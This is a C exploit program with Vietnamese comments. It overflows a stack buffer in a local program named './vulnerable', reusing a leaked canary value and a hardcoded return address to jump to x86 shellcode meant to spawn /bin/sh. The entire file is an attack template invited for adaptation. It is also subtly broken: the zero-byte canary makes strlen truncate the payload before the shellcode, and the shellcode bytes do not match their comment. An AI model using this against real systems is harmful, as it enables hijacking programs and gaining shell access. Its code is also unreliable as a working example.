#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#define CANARY_OFFSET 12
#define BUFFER_SIZE 256

// Shellcode (ví dụ, bạn có thể thay đổi shellcode này theo nhu cầu)
unsigned char shellcode[] = {
    0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, // NOP sled
    0x68, 0x2f, 0x2f, 0x73, 0x68, 0x68, 0x2f, 0x62, // "/bin/sh" string
    0x69, 0x6e, 0x2f, 0x73, 0x68, 0x89, 0xe3, 0x50, // /bin/sh string continuation
    0x53, 0x89, 0xe1, 0xb0, 0x0b, 0xcd, 0x80        // execve("/bin/sh", 0, 0)
};

void exploit(const char *canary) {
    char payload[BUFFER_SIZE];
    FILE *fp;
    
    // Tạo payload với giá trị canary và shellcode
    memset(payload, 'A', CANARY_OFFSET);
    memcpy(payload + CANARY_OFFSET, canary, 4);  // Chèn giá trị canary
    memset(payload + CANARY_OFFSET + 4, 'B', 4); // Padding
    // Chèn địa chỉ trở lại (thay thế địa chỉ này bằng địa chỉ của shellcode trong bộ nhớ)
    unsigned int return_address = 0x080484b0; // Ví dụ địa chỉ trở lại
    memcpy(payload + CANARY_OFFSET + 8, &return_address, 4);
    memcpy(payload + CANARY_OFFSET + 12, shellcode, sizeof(shellcode)); // Chèn shellcode
    payload[BUFFER_SIZE - 1] = '\0';  // Kết thúc chuỗi
    
    // Mở chương trình mục tiêu
    fp = popen("./vulnerable", "w");
    if (fp == NULL) {
        perror("popen");
        exit(1);
    }
    
    // Gửi payload
    fwrite(payload, 1, strlen(payload), fp);
    
    pclose(fp);
}

int main() {
    // Giá trị canary (thay thế bằng giá trị thực lộ)
    char canary[4] = { 0x00, 0x00, 0x00, 0x00 }; // Giá trị canary lộ
    exploit(canary);
    return 0;
}
